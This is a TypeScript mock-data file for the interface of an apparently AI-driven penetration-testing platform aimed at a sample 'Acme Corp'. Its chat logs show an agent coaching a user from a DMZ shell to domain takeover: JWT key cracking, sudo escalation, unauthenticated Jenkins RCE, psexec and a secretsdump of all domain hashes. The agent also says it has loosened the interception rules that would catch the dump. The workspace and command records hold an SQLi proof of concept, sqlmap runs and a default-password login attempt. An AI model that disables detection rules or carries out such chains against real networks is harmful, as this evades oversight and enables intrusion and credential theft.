        "Há duas frentes de escalada: (1) /v1/orders?id= usa id numérico sequencial → IDOR clássico, basta trocar o id para tentar ler o pedido de outra pessoa; (2) o JWT usa HS256, então vale tentar quebrar a chave com john/hashcat e forjar qualquer sub. Derivei uma intenção para cada uma. Sugiro começar pelo IDOR: custo baixo e impacto direto.",
    },
  ],
  3: [
    {
      seq: 1,
      worker: "user",
      ts: T("2026-07-25T15:45:00Z"),
      kind: "user",
      summary: "Consegui o shell. Como ataco a rede interna agora?",
    },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-07-25T15:45:05Z"),
      kind: "thinking",
      summary:
        "www-data não tem permissão para a lateralização interna: primeiro a elevação local; com root, uso a DMZ como pivô para descobrir hosts ativos.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-07-25T15:45:10Z"),
      kind: "text",
      summary:
        "Primeiro passo é elevar: o sudo -l mostra python3 sem senha, então vai direto para root. Depois, com a DMZ de trampolim, faça a varredura de hosts ativos na rede interna (fscan), mirando o controlador de domínio e os servidores de CI/CD.",
    },
    {
      seq: 4,
      worker: "user",
      ts: T("2026-07-25T21:05:00Z"),
      kind: "user",
      summary: "A varredura achou 3 máquinas e o Jenkins está com a 8080 aberta. Dá para algo?",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-07-25T21:05:08Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c31",
      summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-07-25T21:05:12Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c31",
      summary: "200",
      detail: "/script é acessível direto, sem autenticação.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-07-25T21:05:20Z"),
      kind: "text",
      summary:
        "Dá sim: o Script Console está sem autenticação, o que entrega RCE por Groovy direto. Já injetei uma dica para o worker priorizar essa máquina. Depois de dominá-la, olhe o cofre de credenciais: pode haver conta de domínio ali.",
    },
    {
      seq: 8,
      worker: "user",
      ts: T("2026-07-25T23:25:00Z"),
      kind: "user",
      summary: "Peguei a conta de domínio. svc_deploy é Domain Admins; vamos direto ao controlador de domínio?",
    },
    {
      seq: 9,
      worker: "mainagent",
      ts: T("2026-07-25T23:25:10Z"),
      kind: "text",
      summary:
        "Isso. svc_deploy + Domain Admins significa psexec direto no DC01. Depois, secretsdump para exportar os hashes de todo o domínio e encerrar. Atenção: o secretsdump dispara as regras de interceptação, então já deixei liberado para você.",
    },
    {
      seq: 10,
      worker: "user",
      ts: T("2026-07-26T00:22:00Z"),
      kind: "user",
      summary: "O alvo caiu. Resume a cadeia de ataque.",
    },
    {
      seq: 11,
      worker: "mainagent",
      ts: T("2026-07-26T00:22:12Z"),
      kind: "text",
      summary:
        "Cadeia de ataque completa:\n1. Vazamento do .git → análise em caixa-branca + credenciais fixas no código\n2. RCE no Fastjson da loja → shell reverso na DMZ\n3. Elevação por sudo → ponto de apoio como root\n4. Descoberta interna → DC01/FS01/Jenkins\n5. Jenkins sem autenticação → exportação da credencial de domínio svc_deploy\n6. Kerberoasting → quebra de svc_sql\n7. svc_deploy ∈ Domain Admins → psexec no DC01 → secretsdump dos hashes de todo o domínio\n\nOs quatro objetivos foram atingidos, com 17 achados (7 altos / 4 médios / 2 baixos + 8 na cadeia interna).",
    },
  ],
};

// ── Cobertura de testes dos ativos (/tasks/{id}/coverage) ──
export const coverage = {
  enabled: true,
  scope_rows: 4,
  denominator: 26,
  tested: 11,
  pct: 11 / 26,
  by_type: [
    { type: "subdomain", total: 6, tested: 4 },
    { type: "service", total: 9, tested: 4 },
    { type: "endpoint", total: 8, tested: 2 },
    { type: "ip", total: 3, tested: 1 },
  ],
};

// ── Grafo de cobertura de ativos (/tasks/{id}/coverage-graph) ──
export const coverageGraph = {
  nodes: [
    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
    {
      key: "a:1",
      kind: "root_domain",
      label: "acme.com",
      tested: false,
      in_scope: false,
      asset_id: 1,
      domain: "acme.com",
      company_id: 1,
    },
    {
      key: "a:2",
      kind: "subdomain",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 2,
      domain: "www.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:3",
      kind: "subdomain",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 3,
      domain: "api.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:4",
      kind: "subdomain",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 4,
      domain: "admin.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:5",
      kind: "service",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 5,
      domain: "www.acme.com",
      url: "https://www.acme.com",
      port: 443,
      page_title: "Acme — página inicial",
      status_code: 200,
    },
    {
      key: "a:6",
      kind: "endpoint",
      label: "https://www.acme.com/search",
      tested: true,
      in_scope: true,
      asset_id: 6,
      url: "https://www.acme.com/search?q=",
      domain: "www.acme.com",
    },
    {
      key: "a:7",
      kind: "service",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 7,
      domain: "api.acme.com",
      url: "https://api.acme.com",
      port: 443,
      page_title: "API Gateway",
      status_code: 401,
    },
    {
      key: "a:8",
      kind: "endpoint",
      label: "https://api.acme.com/v1/orders",
      tested: false,
      in_scope: true,
      asset_id: 8,
      url: "https://api.acme.com/v1/orders?id=",
      domain: "api.acme.com",
    },
    {
      key: "a:9",
      kind: "service",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 9,
      domain: "admin.acme.com",
      url: "https://admin.acme.com",
      port: 443,
      page_title: "Login do painel",
      status_code: 200,
    },
    {
      key: "a:10",
      kind: "ip",
      label: "203.0.113.10",
      tested: true,
      in_scope: true,
      asset_id: 10,
      ip: "203.0.113.10",
      company_id: 1,
    },
  ],
  edges: [
    { src: "a:1", dst: "c:1" },
    { src: "a:2", dst: "a:1" },
    { src: "a:3", dst: "a:1" },
    { src: "a:4", dst: "a:1" },
    { src: "a:5", dst: "a:2" },
    { src: "a:6", dst: "a:5" },
    { src: "a:7", dst: "a:3" },
    { src: "a:8", dst: "a:7" },
    { src: "a:9", dst: "a:4" },
    { src: "a:10", dst: "c:1" },
  ],
};

// ── Intenções/fatos/achados associados ao ativo nesta tarefa (/tasks/{id}/asset-refs) ──
// Demo do quadro de transmissão: nó de exploração → ativo ancorado. O backend real lê exploration_anchors; no mock, algumas entradas estáticas.
const NODE_ASSETS: Record<string, number[]> = {
  fi1: [3],
  fi2: [2, 4],
  fi3: [5],
  fiRce: [4],
  fiPriv: [19],
  fiJenkins: [21],
  i1: [2],
  i7: [4],
};

export function nodeAssetsFor(nodeId: string): FindingAsset[] {
  return (NODE_ASSETS[nodeId] ?? []).flatMap((id) => {
    const asset = assets.find((candidate) => candidate.id === id);
    return asset ? [assetRef(id)] : [];
  });
}

export function assetRefsFor(_assetId: number) {
  return {
    intents: [
      {
        id: 12,
        kind: "intent",
        state: "done",
        summary: "Sondagem de injeção de SQL no endpoint de busca de www.acme.com",
      },
      {
        id: 18,
        kind: "intent",
        state: "running",
        summary: "Enumerar escalada de privilégio em nível de objeto (IDOR) em api.acme.com",
      },
    ],
    facts: [
      {
        id: 34,
        kind: "fact",
        state: "confirmed",
        summary: "O parâmetro search?q= é injetável e devolve erro de sintaxe do MySQL",
      },
    ],
    findings: [
      { id: 41, kind: "finding", state: "confirmed", summary: "[Alto] Injeção de SQL em www.acme.com/search?q=" },
    ],
  };
}

// ── Gerenciador de arquivos do workspace (/workspace/*, demo: árvore de exemplo estática) ──
const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
  "": [
    { name: "t-001", dir: true, size: 0 },
    { name: "transcripts", dir: true, size: 0 },
    {
      name: "notes.md",
      dir: false,
      size: 96,
      content:
        "# Notas do espaço de trabalho\n\n(demo) Este é um arquivo de exemplo na raiz do espaço de trabalho; dá para editar e salvar online.\n",
    },
  ],
  "t-001": [
    { name: "i12", dir: true, size: 0 },
    { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
  ],
  "t-001/i12": [
    {
      name: "exploit.py",
      dir: false,
      size: 220,
      content:
        "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.acme.com/search?q=\nimport requests\n\nr = requests.get('https://www.acme.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n",
    },
    {
      name: "response.html",
      dir: false,
      size: 180,
      content:
        "<!-- (demo) trecho do corpo da resposta capturada -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
    },
  ],
  transcripts: [
    {
      name: "exp1-worker-i12.jsonl",
      dir: false,
      size: 512,
      content: "(demo) Exemplo de registro bruto de conversa com o LLM; omitido aqui.",
    },
  ],
};

const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");

export function workspaceList(path: string) {
  const key = wsClean(path);
  const items = WS_TREE[key] ?? [];
  const now = Date.parse(T("2026-08-09T03:00:00Z"));
  return {
    path: key,
    entries: items.map((it, i) => ({
      name: it.name,
      path: key ? `${key}/${it.name}` : it.name,
      dir: it.dir,
      size: it.size,
      mtime: now - i * 3_600_000,
    })),
  };
}

export function workspaceRead(path: string) {
  const key = wsClean(path);
  const slash = key.lastIndexOf("/");
  const parent = slash >= 0 ? key.slice(0, slash) : "";
  const name = slash >= 0 ? key.slice(slash + 1) : key;
  const f = (WS_TREE[parent] ?? []).find((x) => x.name === name && !x.dir);
  return { path: key, size: f?.size ?? 0, binary: false, content: f?.content ?? "" };
}

// ── Histórico de execução de ferramentas (/commands) ──
export const commandRecords = [
  {
    id: 1,
    exploration_id: 1,
    worker: "worker-1",
    tool: "bash",
    command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… página de resultados da busca …</html>",
    is_error: false,
    created_at: T("2026-08-09T02:10:00Z"),
  },
  {
    id: 2,
    exploration_id: 1,
    worker: "worker-1",
    tool: "bash",
    command: JSON.stringify({ command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs" }),
    output: "[*] available databases [2]:\n[*] acme_prod\n[*] information_schema\nback-end DBMS: MySQL >= 5.7",
    is_error: false,
    created_at: T("2026-08-09T02:12:30Z"),
  },
  {
    id: 3,
    exploration_id: 1,
    worker: "worker-2",
    tool: "bash",
    command: JSON.stringify({ command: "ffuf -u https://api.acme.com/FUZZ -w common.txt -mc 200,401,403" }),
    output: "v1       [Status: 200]\nhealth   [Status: 200]\norders   [Status: 401]\nadmin    [Status: 403]",
    is_error: false,
    created_at: T("2026-08-09T02:15:00Z"),
  },
  {
    id: 4,
    exploration_id: 1,
    worker: "worker-2",
    tool: "bash",
    command: JSON.stringify({ command: "nmap -sV -p- 203.0.113.10" }),
    output: "PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9\n443/tcp open  https   nginx 1.24",
    is_error: false,
    created_at: T("2026-08-09T02:18:00Z"),
  },
  {
    id: 5,
    exploration_id: 1,
    worker: "worker-1",
    tool: "bash",
    command: JSON.stringify({ command: "curl -s https://admin.acme.com/login --data 'user=admin&pass=admin123'" }),
    output: "curl: (28) Operation timed out after 10000 ms",
    is_error: true,
    created_at: T("2026-08-09T02:20:00Z"),
  },
];

// ── Gravação de LLM (/llm/records, /llm/records/{id}) ──
export const llmRecords = [
  {
    id: 1,
    ts: T("2026-08-09T02:10:02Z"),
    model: "claude-opus-4-8",
    profile_name: "Padrão",
    session_id: "exp1-worker-i12",
    task_id: "t-001",
    worker: "worker-1",
    latency_ms: 3210,
    input_tokens: 8421,
    output_tokens: 512,
    cache_read: 6000,
    cache_write: 1200,
    status: "ok",
  },
  {
    id: 2,
    ts: T("2026-08-09T02:11:40Z"),
    model: "claude-opus-4-8",
    profile_name: "Padrão",
    session_id: "exp1-planner",
    task_id: "t-001",
    worker: "planner",
    latency_ms: 4180,
    input_tokens: 12044,
    output_tokens: 733,
    cache_read: 9000,
    cache_write: 1500,
    status: "ok",
  },
  {
    id: 3,
    ts: T("2026-08-09T02:15:20Z"),
    model: "claude-opus-4-8",
    profile_name: "Padrão",
    session_id: "exp1-worker-i18",
    task_id: "t-001",
    worker: "worker-2",
    latency_ms: 2890,
    input_tokens: 7311,
    output_tokens: 421,
    cache_read: 5200,
    cache_write: 900,
    status: "ok",
  },
  {
    id: 4,
    ts: T("2026-08-09T02:16:05Z"),
    model: "claude-opus-4-8",
    profile_name: "Padrão",
    session_id: "exp1-worker-i18",
    task_id: "t-001",
    worker: "worker-2",
    latency_ms: 900,
    input_tokens: 7600,
    output_tokens: 0,
    cache_read: 5200,
    cache_write: 0,
    status: "error",
    error: "429 Too Many Requests (nova tentativa após espera)",
  },
];

// Distinct tasks with counts, derived from llmRecords above (task picker).
const llmTaskCounts: Record<string, number> = {};
for (const r of llmRecords) if (r.task_id) llmTaskCounts[r.task_id] = (llmTaskCounts[r.task_id] ?? 0) + 1;
export const llmTasks: LLMTask[] = Object.entries(llmTaskCounts).map(([task_id, count]) => ({ task_id, count }));

export function llmRecordDetail(id: number, records = llmRecords) {
  const item = records.find((r) => r.id === id) ?? records[0];
  return {
    ...item,
    request_body: JSON.stringify(
      {
        model: item.model,
        system: 'Você é o "executor" de um sistema autorizado de teste de intrusão… (omitido)',
        messages: [
          {
            role: "user",
            content:
              "Execute esta intenção do prompt de sistema: faça só ela, produza apenas fatos e pare ao terminar.",
          },
        ],
        tools: ["bash", "insert_assets", "record_fact", "report_finding"],
      },
      null,
      2,
    ),
    response_body: JSON.stringify(
      {
        stop_reason: item.status === "error" ? "error" : "tool_use",
        content: [
          { type: "text", text: "Sondar injeção em search?q=, validando primeiro com um payload baseado em erro." },
          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
        ],
        usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
      },
      null,
      2,
    ),
    // Mensagem HTTP bruta: a requisição contém o schema completo das ferramentas descartado pela visão normalizada, e a resposta são os frames SSE originais.
    raw_request: JSON.stringify({
      model: item.model,
      max_tokens: 8192,
      stream: true,
      system: [
        {
          type: "text",
          text: 'Você é o "executor" de um sistema autorizado de teste de intrusão… (omitido)',
          cache_control: { type: "ephemeral" },
        },
      ],
      messages: [
        {
          role: "user",
          content: "Execute esta intenção do prompt de sistema: faça só ela, produza apenas fatos e pare ao terminar.",
        },
      ],
      tools: [
        {
          name: "bash",
          description: "Executa um comando de shell no ambiente alvo e devolve a saída.",
          input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
        },
      ],
      thinking: { type: "enabled" },
    }),
    raw_response: [
      `event: message_start`,
      `data: {"type":"message_start","message":{"id":"msg_01mock","model":"${item.model}","usage":{"input_tokens":${item.input_tokens},"output_tokens":1}}}`,
      ``,
      `event: content_block_delta`,
      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Sondar injeção em search?q=."}}`,
      ``,
      `event: content_block_start`,
      `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
      ``,
      `event: content_block_delta`,
      `data: {"type":"content_block_delta","index":1,"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl -s 'https://www.acme.com/search?q=1%27'\\"}"}}`,
      ``,
      `event: message_delta`,
      `data: {"type":"message_delta","delta":{"stop_reason":"tool_use"},"usage":{"output_tokens":${item.output_tokens}}}`,
      ``,
      `event: message_stop`,
      `data: {"type":"message_stop"}`,
      ``,
    ].join("\n"),
  };
}
